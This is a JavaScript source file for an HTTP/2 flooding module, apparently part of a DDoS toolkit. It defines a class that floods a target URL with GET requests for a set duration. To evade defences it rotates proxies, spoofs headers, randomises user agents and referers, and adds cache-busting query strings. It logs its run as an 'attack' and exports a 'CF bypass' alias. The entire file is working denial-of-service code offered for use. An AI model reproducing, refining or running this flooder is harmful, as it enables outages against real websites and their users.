import http2 from 'http2';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { logger } from '../../utils/logger.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { proxyRotator } from '../../utils/proxy-rotator.js';
import pkg from 'https-proxy-agent';
const { HttpsProxyAgent } = pkg;

/**
 * HTTP/2 Optimized - No Drop After 50k!
 * Features:
 * - Connection pooling
 * - Proper cleanup
 * - Memory management
 * - Rate limiting prevention
 */
export class HTTP2Optimized {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = rpc;
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
        
        // Stats tracking
        this.stats = {
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            totalBytes: 0,
            totalPackets: 0
        };
        
        // Connection pool
        this.connectionPool = [];
        this.maxConnections = 10; // Max concurrent connections
        this.requestsPerConnection = 100; // Requests before rotating connection
        this.connectionCounter = new Map();
    }

    generateHeaders() {
        const headers = {
            ':method': 'GET',
            ':path': this.url.pathname + this.url.search + '?_=' + Date.now(),
            ':scheme': this.url.protocol.replace(':', ''),
            ':authority': this.url.host,
            'user-agent': this.userAgents.length > 0 
                ? Tools.randomChoice(this.userAgents)
                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            ...Tools.generateSpoofHeaders(this.url.host)
        };

        if (this.referers.length > 0) {
            headers['referer'] = Tools.randomChoice(this.referers);
        }

        return headers;
    }

    async getConnection() {
        // Clean up old connections
        this.connectionPool = this.connectionPool.filter(conn => {
            const count = this.connectionCounter.get(conn) || 0;
            if (count >= this.requestsPerConnection || conn.destroyed) {
                try {
                    conn.close();
                } catch (e) {}
                this.connectionCounter.delete(conn);
                return false;
            }
            return true;
        });

        // Create new connection if needed
        if (this.connectionPool.length < this.maxConnections) {
            try {
                // Get rotating proxy
                const proxy = proxyRotator.getNextProxy();
                const connectOptions = {
                    rejectUnauthorized: false,
                    maxSessionMemory: 10, // Limit memory per session
                    settings: {
                        enablePush: false,
                        initialWindowSize: 65535,
                        maxConcurrentStreams: 1000
                    }
                };
                
                // Add proxy agent if available
                if (proxy) {
                    const proxyUrl = `http://${proxy}`;
                    connectOptions.agent = new HttpsProxyAgent(proxyUrl);
                }
                
                const client = http2.connect(this.url.origin, connectOptions);

                client.on('error', () => {
                    try {
                        client.close();
                    } catch (e) {}
                });

                this.connectionPool.push(client);
                this.connectionCounter.set(client, 0);
                
                return client;
            } catch (e) {
                return null;
            }
        }

        // Return existing connection (round-robin)
        return this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
    }

    async sendRequest(client) {
        if (!client || client.destroyed) return;

        return new Promise((resolve) => {
            try {
                const req = client.request(this.generateHeaders());
                
                // Increment connection counter
                const count = this.connectionCounter.get(client) || 0;
                this.connectionCounter.set(client, count + 1);

                let responseReceived = false;
                const timeout = setTimeout(() => {
                    if (!responseReceived) {
                        req.close();
                        this.stats.failedRequests++;
                        resolve();
                    }
                }, 5000); // 5s timeout

                req.on('response', (headers) => {
                    responseReceived = true;
                    clearTimeout(timeout);
                    this.stats.successfulRequests++;
                    this.stats.totalPackets++;
                    REQUESTS_SENT.add(1); // Update global counter
                });

                req.on('data', (chunk) => {
                    this.stats.totalBytes += chunk.length;
                    BYTES_SENT.add(chunk.length); // Update global counter
                });

                req.on('end', () => {
                    clearTimeout(timeout);
                    resolve();
                });

                req.on('error', () => {
                    clearTimeout(timeout);
                    this.stats.failedRequests++;
                    resolve();
                });

                req.end();
                this.stats.totalRequests++;
                this.stats.totalBytes += 200; // Header size estimate
                BYTES_SENT.add(200); // Update global counter

            } catch (e) {
                this.stats.failedRequests++;
                resolve();
            }
        });
    }

    async attack() {
        const client = await this.getConnection();
        if (!client) return;

        const promises = [];
        const batchSize = Math.min(this.rpc, 50); // Max 50 concurrent per batch

        for (let i = 0; i < batchSize; i++) {
            promises.push(this.sendRequest(client));
        }

        await Promise.allSettled(promises);
        
        // Small delay to prevent overwhelming
        await new Promise(resolve => setTimeout(resolve, 10));
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);
        const startTime = Date.now();

        logger.info(`🚀 HTTP2-Optimized attack started`);
        logger.info(`   Target: ${this.url.href}`);
        logger.info(`   Duration: ${this.duration}s`);
        logger.info(`   RPC: ${this.rpc}`);

        // Stats reporter
        const statsInterval = setInterval(() => {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            const rps = Math.floor(this.stats.totalRequests / elapsed);
            logger.info(`📊 [${elapsed}s] Requests: ${this.stats.totalRequests.toLocaleString()} | RPS: ${rps} | Success: ${this.stats.successfulRequests} | Failed: ${this.stats.failedRequests}`);
        }, 5000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }

        clearInterval(statsInterval);

        // Cleanup all connections
        for (const conn of this.connectionPool) {
            try {
                conn.close();
            } catch (e) {}
        }
        this.connectionPool = [];
        this.connectionCounter.clear();

        const totalTime = Math.floor((Date.now() - startTime) / 1000);
        const avgRps = Math.floor(this.stats.totalRequests / totalTime);

        logger.success(`✅ HTTP2-Optimized attack completed!`);
        logger.info(`   Total Requests: ${this.stats.totalRequests.toLocaleString()}`);
        logger.info(`   Success: ${this.stats.successfulRequests.toLocaleString()}`);
        logger.info(`   Failed: ${this.stats.failedRequests.toLocaleString()}`);
        logger.info(`   Average RPS: ${avgRps}`);
        logger.info(`   Total Data: ${(this.stats.totalBytes / 1024 / 1024).toFixed(2)} MB`);
    }

    stop() {
        this.active = false;
        
        // Cleanup
        for (const conn of this.connectionPool) {
            try {
                conn.close();
            } catch (e) {}
        }
        this.connectionPool = [];
        this.connectionCounter.clear();
    }
}

// Export for HTTP2-CF alias
export class HTTP2CFBypass extends HTTP2Optimized {}
